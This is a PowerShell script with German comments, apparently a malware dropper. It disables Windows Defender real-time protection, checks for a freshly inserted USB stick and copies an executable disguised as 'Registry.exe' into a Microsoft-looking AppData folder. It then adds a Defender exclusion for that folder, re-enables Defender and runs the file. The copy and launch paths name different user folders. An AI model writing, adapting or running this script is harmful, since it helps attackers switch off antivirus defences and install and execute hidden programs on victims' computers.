# 1. Windows Defender temporär deaktivieren
Write-Host "Deaktiviere Windows Defender (Echtzeitschutz)..."
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. USB-Stick-Erkennung
Write-Host "Prüfe auf neue USB-Geräte in den letzten 60 Sekunden..."
$timeout = 60
$startTime = Get-Date
$usbDevice = $null

while (((Get-Date) - $startTime).TotalSeconds -lt $timeout -and -not $usbDevice) {
    # Suche nach USB-Massenspeicher-Geräten, die innerhalb der letzten 60 Sekunden angeschlossen wurden
    $usbDevice = Get-WmiObject Win32_USBHub | Where-Object {
        $_.Status -eq "OK" -and
        ($_.PNPDeviceID -match "USBSTOR") -and
        ((Get-Date) - $_.InstallDate).TotalSeconds -le 60
    }
    Start-Sleep -Seconds 5
}

if (-not $usbDevice) {
    Write-Warning "Kein USB-Stick in den letzten 60 Sekunden gefunden."
    # Optional: Abbrechen oder trotzdem fortfahren
    # exit
} else {
    Write-Host "USB-Stick erkannt!"
}

# 3. Datei kopieren
$quelle = "C:\Pfad\zur\Registry.exe"       # <--- bitte anpassen
$zielOrdner = "C:\Users\benutzer\AppData\Roaming\Microsoft\Windows"
$zielDatei = Join-Path $zielOrdner "Registry.exe"

Write-Host "Kopiere Registry.exe nach $zielOrdner"
Copy-Item -Path $quelle -Destination $zielDatei -Force

# 4. Defender-Ausnahme hinzufügen
Write-Host "Füge Defender-Ausnahme für $zielOrdner hinzu"
Add-MpPreference -ExclusionPath $zielOrdner

# 5. Defender wieder aktivieren
Write-Host "Aktiviere Windows Defender wieder..."
Set-MpPreference -DisableRealtimeMonitoring $false

# 6. Datei ausführen (zweiter Pfad)
$ausfuehrPfad = "C:\Users\fusse\AppData\Roaming\Microsoft\Windows\Registry.exe"

Write-Host "Starte Datei $ausfuehrPfad"
Start-Process -FilePath $ausfuehrPfad
